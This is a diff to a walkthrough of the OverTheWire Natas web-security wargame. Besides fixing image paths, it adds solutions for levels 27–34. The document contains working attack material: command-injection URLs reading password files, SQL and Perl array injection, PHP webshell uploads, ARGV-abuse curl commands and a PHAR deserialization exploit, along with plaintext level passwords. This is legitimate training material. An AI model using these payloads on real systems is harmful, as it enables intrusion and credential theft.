@@ -11,11 +11,11 @@
 
 > Solution Steps
 
-![image](images/image0.png)
+![image](image/image0.png)
 
-![image](images/image-0.png)
+![image](image/image-0.png)
 
-![image](images/image--0.png)
+![image](image/image--0.png)
 
 
 1. Open browser and navigate to the URL above
@@ -72,7 +72,7 @@ Step 1: Capture Request in Proxy**
 ![Repeater response - Password found]
 *Click "Send" and find the password in the HTML comment*
 
-![image](images/image1.png)
+![image](image/image1.png)
 
 # Level 1 - 2
 
@@ -90,16 +90,16 @@ Goal: Find the password for natas3
 
 3. Analyze Response in Repeater
    
-   ![image](images/image--2.png)
+   ![image](image/image--2.png)
 
 4. Investigate the /files Directory
   -http://natas2.natas.labs.overthewire.org/files/
 
-   ![image](images/image2.png)
+   ![image](image/image2.png)
 
   -http://natas2.natas.labs.overthewire.org/files/users.txt
    
-   ![image](images/image-2.png)
+   ![image](image/image-2.png)
 
 # Level 2 - 3
 
@@ -115,20 +115,20 @@ Goal: Find the password for natas3
 
 3. Analyze Response in Repeater
 
-   ![image](images/image/3.png)
+   ![image](image/image/3.png)
 
 4. Investigate robots.txt
    -http://natas3.natas.labs.overthewire.org/robots.txt
 
-   ![image](images/image3.png)
+   ![image](image/image3.png)
 
    -http://natas3.natas.labs.overthewire.org/s3cr3t/
 
-   ![image](images/image-3.png)
+   ![image](image/image-3.png)
 
    -http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
 
-   ![image](images/image--3.png)
+   ![image](image/image--3.png)
 
 # Level 3 - 4  
 
@@ -144,13 +144,13 @@ Goal: Find the password for natas3
 
 3. Analyze Response in Repeater
 
-   ![image](images/image4.png)
+   ![image](image/image4.png)
 
 4. Modify the Referer Header  //place of nats4 paste natas5 in referrer//
 
   Referer: http://natas5.natas.labs.overthewire.org/
 
-   ![image](images/image-4.png)
+   ![image](image/image-4.png)
 
 # Level 4 - 5
 
@@ -169,12 +169,12 @@ Goal: Find the password for natas3
     -  Examine Cookies in Request
     In Repeater, look at the request headers. You'll see:
 
-    ![image](images/image5.png)
+    ![image](image/image5.png)
 
 4.  Modify the Cookie Value 
      - Change loggedin to 1
 
-     ![image](images/image-5.png)  
+     ![image](image/image-5.png)  
 
 
 # Level 5 - 6
@@ -194,7 +194,7 @@ Goal: Find the password for natas3
 
 4. Analyze Response in Repeater
 
-    ![image](images/image6.png)
+    ![image](image/image6.png)
 
 5. Locate the Secret File
      - The secret is stored in /includes/secret.inc. In Repeater, modify the request to:
@@ -202,7 +202,7 @@ Goal: Find the password for natas3
     GET /includes/secret.inc HTTP/1.1
     Host: natas6.natas.labs.overthewire.org
      
-    ![image](images/image--6.png)
+    ![image](image/image--6.png)
 
     - The response shows: <? $secret = "FOEIUWGHFEEUHOFUOIU"; ?>
 
@@ -214,7 +214,7 @@ Goal: Find the password for natas3
 
     -Submit the form   
 
-    ![image](images/image!6.png)
+    ![image](image/image!6.png)
 
 # Level 6 - 7
 
@@ -236,11 +236,11 @@ The page has two links: "Home" and "About". Notice the URL pattern when clicking
 
 4. Analyze Response in Repeater
 
-    ![image](images/image7.png)
+    ![image](image/image7.png)
 
 5. Modify the page Parameter
 
-    ![image](images/image-7.png)
+    ![image](image/image-7.png)
 
 
 # Level 7 - 8
@@ -271,7 +271,7 @@ To find the original secret, you need to reverse the process
 after reversal the secret is 
      - Type or paste: oubWYf2kBq in Input secret
 
-![image](images/image8.png)
+![image](image/image8.png)
 
 
 # Level 8 - 9
@@ -294,7 +294,7 @@ Click the "Search" button
 
 You'll see results appear below - these are words from dictionary.txt that contain "test" 
 
-  ![image](images/image--9.png)
+  ![image](image/image--9.png)
 
 2. Command Injection in Burp Suite
 
@@ -304,7 +304,7 @@ You'll see results appear below - these are words from dictionary.txt that conta
 
    Analyze Response in Repeater
 
-   ![image](images/image9.png)
+   ![image](image/image9.png)
 
 3.  Modify for Command Injection / Request
     
@@ -314,7 +314,7 @@ Authorization: Basic bmF0YXM5OlpFMWNrODJsbWRHSW9FcmxoUWdXTkQ2ajJXeno2YjZ0
 Connection: close
 
 
-![image](images/image-9.png)
+![image](image/image-9.png)
 
 
 # Level 9 - 10
@@ -332,14 +332,14 @@ Connection: close
 2. View Source Code
     - In the input field, type a simple word like test 
 
-    ![image](images/image10.png)
+    ![image](image/image10.png)
 3. Capture the request in Burp Proxy
 
 4. Send to Repeater
 
 5. Analyze Response in Repeater
 
-    ![image](images/image-10.png)
+    ![image](image/image-10.png)
 
 6.  Modify with Bypass Payload
 
@@ -351,7 +351,7 @@ Connection: close
 
       Connection: close
 
-      ![image](images/image--10.png)
+      ![image](image/image--10.png)
 
 # Level 10 - 11
 
@@ -369,7 +369,7 @@ Connection: close
 
 3. Click Cookies → http://natas11.natas.labs.overthewire.org
 
-  ![image](images/image11.png)
+  ![image](image/image11.png)
 
 4. Find the cookie named data and copy its Value
 
@@ -386,7 +386,7 @@ Connection: close
      XOR	Key: {"showpassword":"no","bgcolor":"#ffffff"}
       Key format: UTF8
 
-![image](images/image-11.png)
+![image](image/image-11.png)
 
 7. Create New Cookie with "showpassword=yes"
 
@@ -400,7 +400,7 @@ Connection: close
 text
 {"showpassword":"yes","bgcolor":"#ffffff"}
 
-   ![image](images/image--11.png)
+   ![image](image/image--11.png)
 
 8. Step 5: Replace Cookie in Browser
 Go back to Firefox → Developer Tools (F12) → Storage tab
@@ -415,9 +415,9 @@ Paste your new cookie value
 
 Press Enter to save
 
-![image](images/image11.png)
+![image](image/image11.png)
 
-![image](images/image-!11.png)
+![image](image/image-!11.png)
 
 
 # Level 11 - 12
@@ -442,7 +442,7 @@ Press Enter to save
   echo file_get_contents("/etc/natas_webpass/natas13");
 ?>
 
-!![image](images/image12.png)
+!![image](image/image12.png)
 
 5. Set Up Burp Suite
 
@@ -452,18 +452,18 @@ Press Enter to save
 
 8. Analyze Response in Repeater
 
-![image](images/image-12.png)
+![image](image/image-12.png)
 
 9. Modify the Hidden Filename
    - pf2kkeelmb.jpg --> shell.php
 
-![image](images/image--12.png)   
+![image](image/image--12.png)   
 
 10. Access Your Uploaded File
 
     -http://natas12.natas.labs.overthewire.org/upload/lm0ulnvirb.php
 
-![image](images/image-!12.png)
+![image](image/image-!12.png)
 
 
 # Level 12 - 13
@@ -480,7 +480,7 @@ Press Enter to save
 
 2. Create a PHP Webshell with JPEG Magic Bytes
 
-!![image](images/image13.png)
+!![image](image/image13.png)
 
  echo -n -e '\xFF\xD8\xFF\xE0' > magic.hex
  cat magic.hex > shell.php
@@ -498,19 +498,19 @@ file shell.php
 
 7. Analyze Response in Repeater
 
-![image](images/image-13.png)
+![image](image/image-13.png)
 
 8. Modify the Hidden Filename
 
  m3yrfw5agp.jpg --> shell.php
 
-![image](images/image--13.png)
+![image](image/image--13.png)
 
 9. Access Your Uploaded File
 
  -http://natas13.natas.labs.overthewire.org/upload/i647qurbxh.php
 
-![image](images/image-!13.png)
+![image](image/image-!13.png)
 
 
 # Level 13 - 14
@@ -536,7 +536,7 @@ file shell.php
 
     Password: admin
 
-![image](images/image14.png)
+![image](image/image14.png)
 
 4. Capture the request in Burp Proxy
 
@@ -544,7 +544,7 @@ file shell.php
 
 6. Analyze Response in Repeater
 
-![image](images/image-14.png)
+![image](image/image-14.png)
 
 7. Craft the SQL Injection
     
@@ -554,9 +554,9 @@ Username: " OR 1=1 #
 
 Password: anything
 
-![image](images/image--14.png)
+![image](image/image--14.png)
 
-![image](images/image-!14.png)
+![image](image/image-!14.png)
 
 
 # Level 14 - 15
@@ -575,7 +575,7 @@ Password: anything
 2. Understand the Blind SQL Injection
 
      Craft the SQL Injection Payload
-     !![image](images/image--15.png)
+     !![image](image/image--15.png)
 
 3. Manual Testing with Burp Suite
 
@@ -585,9 +585,9 @@ Password: anything
 
 6. Analyze Response in Repeater
 
-![image](images/image15.png)
+![image](image/image15.png)
 
-![image](images/image-15.png)
+![image](image/image-15.png)
 
 7. Automate with Python Script (What We Used)
    The Script We Used
@@ -655,11 +655,11 @@ print("=" * 60)
 
       python3 natas15-solver.py
 
-![image](images/image-!15.png)
+![image](image/image-!15.png)
 
-![image](images/image--!15.png)
+![image](image/image--!15.png)
 
-![image](images/image---!15.png)
+![image](image/image---!15.png)
 
 # Level 15 - 16
 
@@ -680,11 +680,11 @@ print("=" * 60)
 
        Run the Script - python3 natas16_solver.py
 
-![image](images/image16.png)
+![image](image/image16.png)
 
-![image](images/image-16.png)
+![image](image/image-16.png)
 
-![image](images/image--16.png)
+![image](image/image--16.png)
 
        #!/usr/bin/env python3
 import requests
@@ -782,9 +782,9 @@ print("=" * 60)
     - Building the password 
     - Output
 
-    ![image](images/image-!16.png)
+    ![image](image/image-!16.png)
 
-    ![image](images/image-!!16.png)
+    ![image](image/image-!!16.png)
 
 # Level 17 - 18
 
@@ -806,7 +806,7 @@ print("=" * 60)
     - nano natas17_solver.py
 
 4. The Complete Working Script
-![image](images/image17.png)
+![image](image/image17.png)
 
      import requests
 from string import digits, ascii_lowercase, ascii_uppercase
@@ -844,7 +844,7 @@ print(f'Password for natas18: {password_natas18}')
 5. Running the Script
     -python3 natas17_solver.py
 
-![image](images/image-17.png)    
+![image](image/image-17.png)    
 
 # Level 18 - 19
 
@@ -865,7 +865,7 @@ print(f'Password for natas18: {password_natas18}')
 
 4. Python Automation Script
 
-![image](images/image18.png)
+![image](image/image18.png)
 
     import requests
 
@@ -891,7 +891,7 @@ for session_id in range(1, 641):
   else:
     print('No valid session ID found.')
 
- ![image](images/image-18.png)
+ ![image](image/image-18.png)
 
 
  # Level 19 - 20
@@ -917,9 +917,9 @@ Look at the PHPSESSID cookie value - it's a hex string like 3334342d74657374
 
 Decode it using CyberChef or Python: 3334342d74657374
 
-![image](images/image19.png)
+![image](image/image19.png)
 
-![image](images/image-19.png)
+![image](image/image-19.png)
 
 4. Python Automation Script
 
@@ -948,9 +948,9 @@ for session_id in range(1, 641):
   else:
     print('No valid session ID found.')
 
-![image](images/image--19.png)
+![image](image/image--19.png)
 
-![image](images/image-!19.png)
+![image](image/image-!19.png)
 
 # Level 20 - 21
 
@@ -972,13 +972,13 @@ for session_id in range(1, 641):
 
     -Enter any name (e.g., admin) and click "Change name"
 
-    ![image](images/image20.png)
+    ![image](image/image20.png)
 
 4. Modify the Request with Payload   
 
-    ![image](images/image-20.png)
+    ![image](image/image-20.png)
 
-    ![image](images/image--20.png)
+    ![image](image/image--20.png)
 
 5.  Forward the Request
     Click "Forward" in Burp Proxy
@@ -987,7 +987,7 @@ for session_id in range(1, 641):
 
     The response will appear in the browser   
 
-    ![image](images/image-!20.png)
+    ![image](image/image-!20.png)
 
 
 # Level 21 - 22
@@ -1007,30 +1007,30 @@ for session_id in range(1, 641):
 3. Go to the Experimenter Site
     -You'll see a form with CSS styling options
     -click on the link after that it will open page like this 
-    ![image](images/image21.png)
+    ![image](image/image21.png)
 
 4. Set up burpsuite intercept
     - Capture the image21 POST Request
-    ![image](images/image-21.png)
+    ![image](image/image-21.png)
 
 5.  Modify the Request - Add admin=1   
      -align=center&fontsize=100%25&bgcolor=yellow&submit=Update&admin=1
 
-    ![image](images/image--21.png)
+    ![image](image/image--21.png)
 
 6.  Get the Session ID (PHPSESSID)
       -ctrl+shift+i
       -Look at the response headers (in Burp Proxy or HTTP History)
       -Copy this PHPSESSID value - this is your session token
 
-      ![image](images/image---21.png)
+      ![image](image/image---21.png)
 
 7.   Replace Cookie in Main Site
-      ![image](images/image-!21.png) 
+      ![image](image/image-!21.png) 
 
       After replace 
 
-      ![image](images/image-!!21.png)  
+      ![image](image/image-!!21.png)  
 
 # Level 22 - 23
 
@@ -1052,7 +1052,7 @@ for session_id in range(1, 641):
 4. Run the cURL Command
     -curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz "http://natas22.natas.labs.overthewire.org/?revelio"
 
-    ![image](images/image22.png)
+    ![image](image/image22.png)
 
 # Level 23 - 24
 
@@ -1075,7 +1075,7 @@ I chose the password 100iloveyou:
 
 http://natas23.natas.labs.overthewire.org/?passwd=100iloveyou
 
-![image](images/image23.png)
+![image](image/image23.png)
 
 
 # Level 24 - 25
@@ -1097,7 +1097,7 @@ http://natas23.natas.labs.overthewire.org/?passwd=100iloveyou
 
 http://natas24.natas.labs.overthewire.org/?passwd[]=test
 
-![image](images/image24.png)
+![image](image/image24.png)
 
 
 # Level 25 - 26
@@ -1122,11 +1122,11 @@ http://natas24.natas.labs.overthewire.org/?passwd[]=test
 
 6. . Send the request, which will inject your command into the log file, then show you the updated log file.
 
-![image](images/image25.png)
+![image](image/image25.png)
 
 --it will also shows in firefox 
 
-!![image](images/image-25.png)
+!![image](image/image-25.png)
 
 # Level 26 - 27
 
@@ -1151,11 +1151,11 @@ http://natas24.natas.labs.overthewire.org/?passwd[]=test
 
 6. Analyze Response in Repeater
 
-![image](images/image26.png)
+![image](image/image26.png)
 
 7. place the phpsessionid from burpsuite in the url
 
-![image](images/image-26.png)
+![image](image/image-26.png)
 
 8. use php sandbox online compiler to get the drawing result 
 
@@ -1174,13 +1174,13 @@ class Logger{
 $logger = new Logger();
 echo base64_encode(serialize($logger));
 
-![image](images/image--26.png)
+![image](image/image--26.png)
 
 9. paste those result in drawing value    - click ctrl+shift+i
 
-![image](images/image-!26.png)
+![image](image/image-!26.png)
 
-!![image](images/image-!!26.png)
+!![image](image/image-!!26.png)
 
 # Level 27 - 28
 
@@ -1196,3 +1196,304 @@ echo base64_encode(serialize($logger));
 1. Initial Observation
 
 2. Understand the challenge
+
+3. calculate required spaces
+
+4. In Python:
+
+   python
+   $ python -c "print('+' * (64 - len('natas28')))"
+   +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+5. capture the request in Burp Proxy
+     username :  natas28
+     password : password  in main page after login as natas27 
+     after giving this data send to burp 
+6. Analyze Response in Repeater
+
+![image](image/image27.png)
+
+7. Create the Duplicate User
+     -username=natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++x&password=password
+
+     ![image](image/image-27.png)
+
+8. Send the request, which will inject your command into the log file, then show you the updated log file.
+
+!![image](image/image--27.png)
+
+9. Login as natas28
+    -Username: natas28              x //make sure give 57 spaces after natas 28 //
+
+     -Password: password
+
+     ![image](image/image-!27.png)
+
+> Method 2 easy 
+
+  login as natas27
+  in username : test
+  in password : 123
+  -click on login 
+  -it shows created
+  -come back to main page remove test place natas28 give 57 spaces and place x 
+  and again login 
+  -after that again comeback now remove x after natas 28 leave those spaces like that only 
+# Level 28 - 29
+
+> Level Information
+
+- **URL**: `http://natas28.natas.labs.overthewire.org`
+- **Username**: `natas28`
+- **Password**: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
+- **Goal**: Find the password for natas29
+
+> Solution Steps
+
+1. Initial Observation
+
+2. Understand the challenge 
+
+3. http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOntzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
+
+![image](image/image28.png)
+
+
+# Level 29 - 30
+
+> Level Information
+
+- **URL**: `http://natas29.natas.labs.overthewire.org`
+- **Username**: `natas29`
+- **Password**: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
+- **Goal**: Find the password for natas30
+
+> Solution Steps
+
+1. Initial Observation
+
+2. Understand the challenge
+
+3. http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/n?tas_webpass/n?tas30%20%00
+
+![image](image/image29.png)
+
+
+# Level 30 - 31
+
+> Level Information
+
+- **URL**: `http://natas30.natas.labs.overthewire.org`
+- **Username**: `natas30`
+- **Password**: - **Password**: 
+WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH 
+
+- **Goal**: Find the password for natas31
+
+> Solution Steps
+
+1. Initial Observation
+
+2. Understand the challenge
+
+3. #!/usr/bin/env python3
+import requests
+import urllib3
+from requests.auth import HTTPBasicAuth
+
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+ ===== YOUR CREDENTIALS =====
+username = 'natas30'
+password = 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH'
+url = "http://natas30.natas.labs.overthewire.org/index.pl"
+ =============================
+
+ The exploit: password as an array (not a string!)
+ This tricks the Perl CGI into treating it differently
+params = {
+    "username": "natas28",  # We want to login as natas28
+    "password": ["'whatever' or 1", 4]  # Array injection
+}
+
+print("=" * 60)
+print("NATAS 30 → 31 PERL ARRAY INJECTION")
+print("=" * 60)
+print(f"[*] Target: {url}")
+print(f"[*] Username: {params['username']}")
+print(f"[*] Password: [array]")
+
+ Send the request
+response = requests.post(url, 
+                        data=params, 
+                        auth=HTTPBasicAuth(username, password),
+                        verify=False)
+
+print("\n" + "=" * 60)
+print("RESPONSE:")
+print("=" * 60)
+print(response.text)
+
+![image](image/image30.png)
+
+![image](image/image-30.png)
+
+
+# level 31 - 32
+
+> Level Information
+
+- **URL**: `http://natas31.natas.labs.overthewire.org`
+- **Username**: `natas31`
+- **Password**: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
+- **Goal**: Find the password for natas32
+
+> Solution Steps
+
+1. Initial Observation
+
+2. Understand the challenge
+
+3. create test.csv file in kali linux and upload it to natas31
+
+4. in that file 1,2,
+                3,4,  jus this, only enter 
+5. send to repeater 
+
+6. analyze the request 
+
+7. modify the request 
+   ![image](image/image31.png)
+
+
+# Level 32 - 33
+
+> Level Information
+
+- **URL**: `http://natas32.natas.labs.overthewire.org`
+- **Username**: `natas32`
+- **Password**: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
+- **Goal**: Find the password for natas33
+
+> Solution Steps(using kali terminal)
+
+1. Initial Observation
+   //paste this in terminal//
+
+   curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B \
+  'http://natas32.natas.labs.overthewire.org//index.pl?ls%20.%20|' \
+  -F 'file=ARGV' \
+  -F 'file=@test.csv;filename=test.csv' \
+  -F 'submit=Upload'
+
+  ![image](image/image32.png)
+
+2. Create a dummy CSV file (required for the form)
+
+   echo "1,2,3,4" > test.csv
+
+   ![image](image/image-32.png)
+
+3. Execute the binary with pipe to capture output
+   
+   curl -u natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B \
+  'http://natas32.natas.labs.overthewire.org//index.pl?./getpassword%20|' \
+  -F 'file=ARGV' \
+  -F 'file=@test.csv;filename=test.csv' \
+  -F 'submit=Upload'
+   
+   ![image](image/image--32.png)
+
+   ![image](image/image-!32.png)
+
+# Level 33 - 34
+
+> Level Information
+
+- **URL**: `http://natas33.natas.labs.overthewire.org`
+- **Username**: `natas33`
+- **Password**: 2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
+- **Goal**: Find the password for natas34
+
+> Solution Steps(using kali terminal)
+
+1. Initial Observation
+
+    -View the page
+curl -u natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ \
+  http://natas33.natas.labs.overthewire.org
+
+ -View the source code (critical!)
+curl -u natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ \
+  http://natas33.natas.labs.overthewire.org/index-source.html
+
+![image](image/image33.png)
+
+2. Create the malicious PHAR file
+
+   <?php
+class Executor{
+    private $filename = "";
+    private $signature = "adeafbadbabec0dedabada55ba55d00d";
+    private $init = false;
+    
+    public function __construct($filename) {
+        $this->filename = $filename;
+    }
+}
+
+// Create PHAR with metadata containing our object
+$phar = new Phar('natas.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+// IMPORTANT: Use the current session ID from the form
+$current_session = "SESSION_ID_FROM_FORM"; // Replace with actual value
+$object = new Executor($current_session);
+$phar->setMetadata($object);
+$phar->stopBuffering();
+
+echo "[+] PHAR file created with filename: $current_session\n";
+?>
+
+![image](image/image-33.png)
+
+
+3. Generate the PHAR file
+    
+    php -d phar.readonly=0 create_phar.php
+  
+![image](image/image--33.png)
+
+4. Get current session ID from the form
+
+     -The session ID appears in the hidden "filename" input field
+
+     curl -u natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ \
+     http://natas33.natas.labs.overthewire.org | grep -o 'value="[^"]*"'
+
+ ![image](image/image---33.png)    
+
+5. Upload with PHAR wrapper to trigger deserialization
+
+    curl -u natas33:2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ \
+  http://natas33.natas.labs.overthewire.org/index.php \
+  -F "MAX_FILE_SIZE=4096" \
+  -F "filename=phar://natas.phar/test.txt" \
+  -F "uploadedfile=@natas.phar" \
+  -v
+
+![image](image/image-!33.png)
+
+![image](image/image--!33.png)
+
+# Level 34  
+
+> Level Information
+
+- **URL**: `http://natas34.natas.labs.overthewire.org`
+- **Username**: `natas34`
+- **Password**: j4O7Q7Q5er5XFRCepmyXJaWCSIrslCJY
+
+![image](image/image34.png)
